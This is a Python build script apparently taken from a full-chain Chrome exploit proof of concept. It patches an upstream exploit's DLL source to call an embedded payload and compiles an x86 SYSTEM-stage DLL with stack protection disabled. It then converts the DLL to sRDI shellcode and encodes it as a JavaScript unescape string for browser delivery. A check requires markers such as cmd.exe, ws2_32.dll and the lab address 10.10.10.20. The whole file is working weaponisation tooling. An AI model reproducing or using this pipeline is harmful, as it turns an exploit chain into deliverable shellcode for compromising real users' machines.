#!/usr/bin/env python3
"""Build the x86 SYSTEM-stage DLL and convert it to embedded sRDI shellcode."""

from __future__ import annotations

import argparse
import hashlib
import importlib.util
import re
import shutil
import struct
import subprocess
import tempfile
from pathlib import Path


UPSTREAM_COMMIT = "c95c8123fe37ea34b82f7560ae683bde7889d4eb"
SRDI_COMMIT = "9fdd5c44383039519accd1e6bac4acd5a046a92c"
UPSTREAM_SOURCE = Path(
    "FullChainChromeExploit/FullChainChromeExploit/dllmain.cpp"
)
INCLUDE_ANCHOR = '#include "bcrypt.h" // Included to define NTSTATUS'
ORIGINAL_COMMAND = 'WinExec("cmd.exe", 1);'
EMBEDDED_COMMAND = "RunEmbeddedPayload();"
PAYLOAD_DECLARATION = 'extern "C" BOOL RunEmbeddedPayload(void);'


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def git_revision(repository: Path) -> str:
    return subprocess.run(
        ["git", "-C", str(repository), "rev-parse", "HEAD"],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def require_revision(repository: Path, expected: str, label: str) -> None:
    actual = git_revision(repository)
    if actual != expected:
        raise ValueError(f"unexpected {label} commit: {actual}")


def patch_upstream_source(source: str) -> str:
    if source.count(INCLUDE_ANCHOR) != 1:
        raise ValueError("expected one upstream include anchor")
    if source.count(ORIGINAL_COMMAND) != 1:
        raise ValueError("expected one upstream WinExec command")

    patched = source.replace(
        INCLUDE_ANCHOR,
        f"{INCLUDE_ANCHOR}\n\n{PAYLOAD_DECLARATION}",
        1,
    )
    return patched.replace(ORIGINAL_COMMAND, EMBEDDED_COMMAND, 1)


def encode_words(data: bytes) -> str:
    if len(data) % 2:
        raise ValueError("shellcode length must be even")
    return "".join(
        f"%u{data[index + 1]:02x}{data[index]:02x}"
        for index in range(0, len(data), 2)
    )


def decode_words(text: str) -> bytes:
    words = re.findall(r"%u([0-9a-fA-F]{4})", text)
    output = bytearray()
    for word in words:
        value = int(word, 16)
        output.extend((value & 0xFF, value >> 8))
    return bytes(output)


def shellcode_javascript(shellcode: bytes) -> tuple[str, bytes]:
    padded = shellcode if len(shellcode) % 2 == 0 else shellcode + b"\x90"
    javascript = f'var shellcode = unescape("{encode_words(padded)}");\n'
    return javascript, padded


def find_compiler(toolchain_root: Path | None, requested: Path | None) -> Path:
    if requested is not None:
        compiler = requested.resolve()
        if not compiler.is_file():
            raise FileNotFoundError(f"compiler not found: {compiler}")
        return compiler

    if toolchain_root is not None:
        executable_names = (
            "i686-w64-mingw32-clang++.exe",
            "i686-w64-mingw32-clang++",
            "clang++.exe",
            "clang++",
            "clang.exe",
            "clang",
        )
        for name in executable_names:
            candidate = toolchain_root.resolve() / "bin" / name
            if candidate.is_file():
                return candidate

    for name in ("i686-w64-mingw32-clang++", "clang++", "clang"):
        candidate = shutil.which(name)
        if candidate:
            return Path(candidate)

    raise FileNotFoundError("x86-capable Clang compiler not found")


def load_srdi(srdi_root: Path):
    module_path = srdi_root / "Python" / "ShellcodeRDI.py"
    if not module_path.is_file():
        raise FileNotFoundError(module_path)
    spec = importlib.util.spec_from_file_location("pinned_shellcode_rdi", module_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"cannot load sRDI module: {module_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def verify_embedded_artifact(data: bytes, label: str) -> None:
    lowered = data.lower()
    required = (b"calc.exe", b"cmd.exe", b"10.10.10.20", b"ws2_32.dll")
    forbidden = (b"downloads", b"p.exe", b"powershell", b"http://", b"https://")

    for marker in required:
        if marker not in lowered:
            raise ValueError(f"{label} missing marker: {marker.decode()}")
    for marker in forbidden:
        if marker in lowered:
            raise ValueError(f"{label} contains forbidden marker: {marker.decode()}")


def verify_i386_dll(data: bytes) -> None:
    if data[:2] != b"MZ":
        raise ValueError("output is not a PE file")
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if data[pe_offset:pe_offset + 4] != b"PE\0\0":
        raise ValueError("output has no PE signature")
    machine = struct.unpack_from("<H", data, pe_offset + 4)[0]
    if machine != 0x14C:
        raise ValueError(f"expected I386 DLL, got machine 0x{machine:04x}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--upstream-root", required=True, type=Path)
    parser.add_argument("--srdi-root", required=True, type=Path)
    parser.add_argument("--toolchain-root", type=Path)
    parser.add_argument("--compiler", type=Path)
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()

    upstream_root = args.upstream_root.resolve()
    srdi_root = args.srdi_root.resolve()
    require_revision(upstream_root, UPSTREAM_COMMIT, "upstream")
    require_revision(srdi_root, SRDI_COMMIT, "sRDI")

    poc_root = Path(__file__).resolve().parents[1]
    output_dir = (args.output_dir or (poc_root / "build")).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    source_path = upstream_root / UPSTREAM_SOURCE
    payload_path = poc_root / "payload" / "payload.c"
    compiler = find_compiler(args.toolchain_root, args.compiler)
    dll_path = output_dir / "FullChainEmbedded.dll"
    shellcode_path = output_dir / "shellcode.bin"
    javascript_path = output_dir / "shellcode.js"

    patched_source = patch_upstream_source(
        source_path.read_text(encoding="utf-8-sig")
    )

    with tempfile.TemporaryDirectory(prefix="embedded-poc-") as temporary:
        patched_path = Path(temporary) / "dllmain.cpp"
        patched_path.write_text(patched_source, encoding="utf-8", newline="\n")
        command = [
            str(compiler),
            "--target=i686-w64-windows-gnu",
            "-x", "c++",
            "-std=c++14",
            "-O2",
            "-s",
            "-shared",
            "-fms-extensions",
            "-fasm-blocks",
            "-fno-stack-protector",
            "-fno-exceptions",
            "-fno-rtti",
            "-DWIN32",
            "-DNDEBUG",
            "-D_WINDOWS",
            "-D_USRDLL",
            "-DUNICODE",
            "-D_UNICODE",
            "-D_WIN32_WINNT=0x0601",
            f"-I{source_path.parent}",
            "-Wl,--subsystem,windows",
            "-o", str(dll_path),
            str(patched_path),
            str(payload_path),
            "-lws2_32",
            "-luser32",
            "-lgdi32",
            "-lkernel32",
        ]
        subprocess.run(command, check=True)

    dll_bytes = dll_path.read_bytes()
    verify_i386_dll(dll_bytes)
    verify_embedded_artifact(dll_bytes, "DLL")

    srdi = load_srdi(srdi_root)
    converted = srdi.ConvertToShellcode(dll_bytes, 0, b"", 0)
    javascript, padded_shellcode = shellcode_javascript(converted)
    verify_embedded_artifact(padded_shellcode, "shellcode")
    shellcode_path.write_bytes(padded_shellcode)
    try:
        javascript_path.write_text(javascript, encoding="ascii", newline="\n")
        javascript_hash = sha256(javascript_path)
    except OSError as error:
        raise RuntimeError(
            "shellcode.js was blocked after generation; build inside Kali "
            "instead of weakening host security"
        ) from error

    print(f"dll={dll_path}")
    print(f"dll_sha256={sha256(dll_path)}")
    print(f"shellcode={shellcode_path}")
    print(f"shellcode_sha256={sha256(shellcode_path)}")
    print(f"javascript={javascript_path}")
    print(f"javascript_sha256={javascript_hash}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
